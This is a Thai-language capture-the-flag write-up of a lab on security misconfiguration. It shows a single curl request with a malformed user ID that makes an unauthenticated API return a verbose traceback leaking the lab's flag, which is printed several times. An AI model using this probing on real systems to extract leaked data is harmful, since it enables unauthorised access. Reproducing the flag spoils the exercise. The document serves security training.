# AS02: Security Misconfigurations

Target: http://10.x.x.x:5002   
Flag: `THM{V3RB0S3_3RR0R_L34K}`

---

## 1. บทนำ

แลปนี้เป็นการฝึกทดสอบช่องโหว่ประเภท `Security Misconfiguration` ซึ่งเกิดจากการตั้งค่าระบบไม่เหมาะสม โดยในแลปนี้พบว่า API ที่เกี่ยวกับการจัดการผู้ใช้ถูกเปิดให้เข้าถึงได้โดยไม่ต้องมีการยืนยันตัวตน และระบบยังเปิดการแสดง error แบบละเอียด (verbose error) ทำให้ข้อมูลสำคัญรั่วไหลออกมาได้

---

## 2. สิ่งที่พบจากหน้าเว็บ

เมื่อเข้าเว็บไซต์หลัก จะพบหน้าเว็บที่แสดงข้อมูลเกี่ยวกับ API โดยตรงดังนี้

```bash
GET /api/user/<user_id>
GET /api/user/123
Retrieve user information by ID. User ID must be numeric.
```

จากข้อความข้างต้น ระบบมีการบอกว่า `user_id` ต้องเป็นตัวเลข ซึ่งถือเป็นการเปิดเผยรายละเอียดภายในของระบบให้ผู้ใช้งานทั่วไปเห็น

---

## 3. การเรียกใช้งาน Endpoint ที่ผิดพลาด

เมื่อทดลองเรียก endpoint โดยใช้ `user_id` ที่ไม่ใช่ตัวเลขด้วยคำสั่ง `curl` ดังนี้

```bash
curl -i http://10.x.x.x:5002/api/user/test
```

พบว่าระบบตอบกลับด้วย error และแสดงข้อมูล debug ออกมาดังนี้

```bash
{
    "debug_info":
    {
        "flag": "THM{V3RB0S3_3RR0R_L34K}"
    },
    "error": "Invalid user ID format: test. Flag: THM{V3RB0S3_3RR0R_L34K}",
    "traceback": "Traceback (most recent call last):\n  File \"/app/app.py\",line 21, in get_user\n
    raise ValueError(f\"Invalid user ID format: {user_id}.
    Flag: {FLAG}\")\nValueError: Invalid user ID format: test.
    Flag: THM{V3RB0S3_3RR0R_L34K}\n"
}
```

error ดังกล่าวระบุว่า `user_id` นั้นไม่ใช่ตัวเลข

---

## 4. Flag ที่ได้

จาก error message ที่ระบบแสดง ทำให้ได้รับ flag ได้ดังนี้

`THM{V3RB0S3_3RR0R_L34K}`

---

## 5. สรุปสิ่งที่ได้เรียนรู้

- การตั้งค่าระบบที่ไม่เหมาะสมสามารถทำให้ข้อมูลสำคัญรั่วไหลได้
- การเปิด debug หรือ error message แบบละเอียดในระบบจริงเป็นสิ่งที่อันตราย
- แม้จะไม่ได้โจมตีด้วยเทคนิคที่ซับซ้อน แต่การลองเรียก API ที่ไม่ควรเปิด ก็สามารถนำไปสู่การได้ข้อมูลสำคัญของระบบได้